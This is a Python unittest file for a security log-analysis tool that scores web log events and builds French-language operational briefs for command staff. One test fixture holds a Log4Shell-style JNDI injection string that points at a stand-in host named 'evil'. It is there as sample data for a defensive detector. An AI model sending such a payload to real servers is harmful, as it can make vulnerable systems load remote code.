"""Tests for operational translation (Étape 5)."""

from __future__ import annotations

import json
import sys
import tempfile
import unittest
from datetime import datetime, timezone
from pathlib import Path

PROJECT_ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(PROJECT_ROOT))

from marine_log_sentinel.ml.models import AnomalyScore, LogPrediction, TtpHit  # noqa: E402
from marine_log_sentinel.scoring.models import (  # noqa: E402
    EvidenceChain,
    ScoreBreakdown,
    ScoredLog,
)
from marine_log_sentinel.translation.assets import AssetInventory  # noqa: E402
from marine_log_sentinel.translation.brief import build_operational_brief_fr  # noqa: E402
from marine_log_sentinel.translation.impacts import headline_fr, operational_impacts_fr  # noqa: E402


def _sample_prediction(*, host: str | None = None, src_ip: str | None = None) -> LogPrediction:
    ttp = TtpHit(
        technique_id="T1190",
        technique_name="Exploit Public-Facing Application",
        score=0.2,
        tactics=["initial-access"],
    )
    return LogPrediction(
        timestamp_utc=datetime(2026, 5, 12, 10, 0, tzinfo=timezone.utc),
        source_format="apache_access",
        event_category="web_request",
        source_file="x.jsonl",
        raw_excerpt='GET /?x=${jndi:ldap://evil/a}',
        host=host,
        src_ip=src_ip,
        anomaly=AnomalyScore(score=0.5, method="test"),
        top_ttps=[ttp],
    )


def _minimal_scored(prediction: LogPrediction) -> ScoredLog:
    ev = EvidenceChain(top_ttp=prediction.top_ttps[0] if prediction.top_ttps else None)
    bd = ScoreBreakdown(
        anomaly_term=0.15,
        ttp_term=0.05,
        cve_term=0.2,
        suspicious_term=0.02,
        kev_boost_applied=0.1,
        asset_factor=1.0,
        base_score=0.52,
        final_score=52.0,
    )
    return ScoredLog(
        prediction=prediction,
        score=bd.final_score,
        severity_band="HIGH",
        breakdown=bd,
        evidence=ev,
        weights_fingerprint="abc",
        bands_fingerprint="def",
    )


class AssetInventoryTest(unittest.TestCase):
    def test_resolves_host_before_ip(self):
        raw = {
            "default_criticality": "low",
            "hosts": {
                "10.0.0.5": {"criticality": "high", "designation": "Pont A"},
                "192.168.1.1": {"criticality": "medium", "designation": "Routeur"},
            },
        }
        with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False) as tmp:
            json.dump(raw, tmp)
            path = Path(tmp.name)
        try:
            inv = AssetInventory.load(path)
            pred = _sample_prediction(host="10.0.0.5", src_ip="192.168.1.1")
            hit = inv.resolve(pred)
            self.assertAlmostEqual(hit.factor, 1.35)
            self.assertEqual(hit.designation_fr, "Pont A")
        finally:
            path.unlink(missing_ok=True)


class OperationalBriefTest(unittest.TestCase):
    def test_headline_contains_technique(self):
        ttp = TtpHit(
            technique_id="T1190",
            technique_name="Exploit Public-Facing Application",
            score=0.1,
        )
        h = headline_fr(ttp, "HIGH")
        self.assertIn("T1190", h)

    def test_impacts_are_non_empty_for_t1190(self):
        ttp = TtpHit(technique_id="T1190", technique_name="X", score=0.1)
        im = operational_impacts_fr(ttp)
        self.assertGreaterEqual(len(im), 2)

    def test_brief_includes_command_summary(self):
        pred = _sample_prediction()
        scored = _minimal_scored(pred)
        brief = build_operational_brief_fr(scored)
        self.assertIn("T1190", brief.resume_pour_commandement)
        self.assertTrue(brief.actions_prioritaires)


if __name__ == "__main__":
    unittest.main()
